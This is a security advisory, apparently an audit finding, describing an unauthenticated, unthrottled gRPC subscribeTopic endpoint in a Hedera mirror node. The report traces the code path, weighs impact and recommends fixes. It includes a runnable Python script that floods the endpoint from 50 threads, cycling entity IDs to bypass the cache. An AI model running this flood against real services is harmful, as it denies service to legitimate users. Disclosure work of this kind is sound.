### Title
Unauthenticated gRPC `subscribeTopic` Endpoint Lacks Rate Limiting, Enabling Resource Exhaustion via Non-TOPIC Entity Abuse

### Summary
The `subscribeTopic()` endpoint in `ConsensusController` accepts requests from any unauthenticated caller. When a `topicID` resolving to a non-TOPIC entity (e.g., an account) is submitted, `topicExists()` in `TopicMessageServiceImpl` throws `IllegalArgumentException("Not a valid topic")`, which is mapped to `Status.INVALID_ARGUMENT` and returned immediately. With no application-level rate limiting or connection count limit on the gRPC service, an attacker can open many connections and flood the server with such requests using many distinct entity IDs, exhausting server-side resources (thread pool, DB connection pool) and degrading service availability.

### Finding Description

**Code path:**

1. `ConsensusController.subscribeTopic()` — [1](#0-0)  — accepts any unauthenticated `ConsensusTopicQuery` with no pre-validation or rate check.

2. `toFilter()` calls `EntityId.of(query.getTopicID())` — [2](#0-1)  — which succeeds for any valid numeric ID (account, token, contract, etc.).

3. `TopicMessageServiceImpl.topicExists()` — [3](#0-2)  — queries `entityRepository.findById()`, and if the entity exists but has a non-TOPIC type, emits `Mono.error(new IllegalArgumentException("Not a valid topic"))`.

4. `ProtoUtil.toStatusRuntimeException()` — [4](#0-3)  — maps `IllegalArgumentException` to `Status.INVALID_ARGUMENT`, which is sent via `responseObserver::onError` and the stream terminates.

**Root cause:** No authentication, no per-IP connection limit, and no application-level rate limiting exist on the gRPC service. The only concurrency control is `maxConcurrentCallsPerConnection = 5` — [5](#0-4)  — which limits streams per connection but imposes no cap on the number of connections.

**Cache partial mitigation and its bypass:** `EntityRepository.findById()` is annotated `@Cacheable(unless = "#result == null")` with a 24h TTL and 50,000-entry max — [6](#0-5)  — [7](#0-6)  — so repeated requests for the *same* entity ID hit the cache. However, Hedera has millions of public non-TOPIC entities (accounts, tokens, contracts). An attacker cycling through distinct entity IDs continuously bypasses the cache, triggering a fresh DB query per unique ID.

### Impact Explanation

Each request with a novel non-TOPIC entity ID causes a synchronous JDBC call (`entityRepository.findById`) executed on the bounded-elastic scheduler. Flooding with many distinct IDs exhausts the DB connection pool and the bounded-elastic thread pool, degrading or denying service to legitimate subscribers of the mirror node's gRPC API. This is a mirror node component; it does not participate in Hedera consensus, so it cannot cause "total network shutdown" or prevent transaction confirmation on the main network. The impact is limited to mirror node gRPC service unavailability.

### Likelihood Explanation

No privileges are required. All Hedera entity IDs (accounts, tokens, contracts) are publicly enumerable from the mirror node's own REST API. A single attacker with a modest number of TCP connections (each carrying 5 concurrent streams) can sustain thousands of requests per second. The GCP gateway `maxRatePerEndpoint: 250` — [8](#0-7)  — is an optional infrastructure control that is not enforced at the application layer and can be bypassed by direct access to the service.

### Recommendation

1. **Add application-level rate limiting** to the gRPC service (e.g., using a token-bucket interceptor per source IP), analogous to the `ThrottleConfiguration` already present in the `web3` module.
2. **Limit total concurrent connections** via Netty's `maxConnectionAge` / connection-count settings in `GrpcConfiguration`.
3. **Pre-validate entity type before the DB lookup** where possible, or return a cached sentinel for known-bad IDs to prevent cache-bypass via ID enumeration.
4. **Enforce the GCP gateway rate limit** as a mandatory infrastructure control, not an optional one.

### Proof of Concept

**Preconditions:**
- Mirror node gRPC endpoint is reachable (port 5600).
- At least one non-TOPIC entity ID is known (e.g., account `0.0.2` always exists on Hedera).

**Steps:**

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

def flood(target, entity_num_start, count):
    channel = grpc.insecure_channel(target)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for i in range(count):
        topic_id = basic_types_pb2.TopicID(topicNum=entity_num_start + i)
        query = consensus_service_pb2.ConsensusTopicQuery(topicID=topic_id)
        try:
            for _ in stub.subscribeTopic(query):
                pass
        except grpc.RpcError:
            pass  # Expected INVALID_ARGUMENT or NOT_FOUND

# Launch many threads, each using a different range of entity IDs to bypass cache
threads = []
for t in range(50):
    th = threading.Thread(target=flood, args=("mirror-node-host:5600", t * 1000, 1000))
    threads.append(th)
    th.start()
for th in threads:
    th.join()
```

**Expected result:** DB connection pool and bounded-elastic thread pool are saturated; legitimate `subscribeTopic` calls from real clients time out or receive `RESOURCE_EXHAUSTED` / `UNAVAILABLE` errors.

    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
